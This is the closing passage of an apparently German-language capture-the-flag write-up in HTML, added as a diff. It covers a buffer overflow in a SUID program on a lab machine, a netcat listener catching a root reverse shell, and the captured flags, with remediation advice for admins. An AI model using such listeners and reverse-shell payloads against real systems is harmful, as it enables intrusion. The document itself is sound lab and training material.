+               <p class="evaluation">**Bewertung:** Dies ist der kritische Schritt, der die Schwachstelle ausnutzt. Wenn die Puffergröße, der Offset zum Return Pointer und die Zieladresse korrekt sind, wird die Programmausführung gekapert.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Die genaue Anzahl der 'a's (Offset) und die Zieladresse müssen durch Debugging (z.B. mit `gdb`) des `sacrifice`-Programms ermittelt werden. ASLR (Address Space Layout Randomization) könnte diesen Exploit erschweren, falls es auf dem System aktiv ist (was bei älteren Debian-Versionen nicht immer der Standard war).<br>**Empfehlung (Admin):** Entfernen Sie das verwundbare SUID-Programm `sacrifice`. Kompilieren Sie Programme mit Schutzmechanismen wie Stack Canaries, ASLR und NX-Bit. Überprüfen Sie regelmäßig SUID/GUID-Dateien auf dem System.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                       <pre>
+listening on [any] 1234 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.141] 55230</span> <span class="password"><-- Root-Shell erhalten!</span></pre>
+                       <pre><span class="comment">--------------------------------------------------------------------------------</span></pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:** Der Netcat-Listener auf der Angreifer-Maschine (Port 1234) zeigt eine eingehende Verbindung von der Ziel-IP `192.168.2.141` (die IP von `titan.vm`).</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Der Buffer Overflow Exploit hat funktioniert. Der Payload (das `fire`-Skript mit der Reverse Shell) wurde mit Root-Rechten ausgeführt und hat sich erfolgreich zurück zum Listener verbunden. Der Angreifer hat nun eine Root-Shell.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `id` aus, um die Root-Rechte zu bestätigen. Suchen Sie nach den User- und Root-Flags.<br>**Empfehlung (Admin):** System vollständig kompromittiert. Leiten Sie Incident-Response-Maßnahmen ein. Beheben Sie die Buffer-Overflow-Schwachstelle in `sacrifice` (oder entfernen Sie das Programm) und die unsicheren Sudo-Konfigurationen.</p>
+             </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Aus der erhaltenen Root-Shell werden die User- und Root-Flags ausgelesen. Die Fundorte werden aus den `cat`-Befehlen am Ende des Logs extrahiert.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat user.txt</div> <span class="comment"><-- Pfad nicht spezifiziert, Annahme /home/prometheus oder /home/zeus --></span>
+                           <div class="flag-value"><span class="password">HMVolympiangods</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** Die User-Flag `HMVolympiangods` wurde erfolgreich gefunden.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">HMVgodslovesyou</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Die Root-Flag `HMVgodslovesyou` wurde erfolgreich im Verzeichnis `/root` gefunden.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: [Datum nicht im Log gefunden]</p> <!-- Kein Datum im Log gefunden -->
+    </footer>
+</body>
+</html>
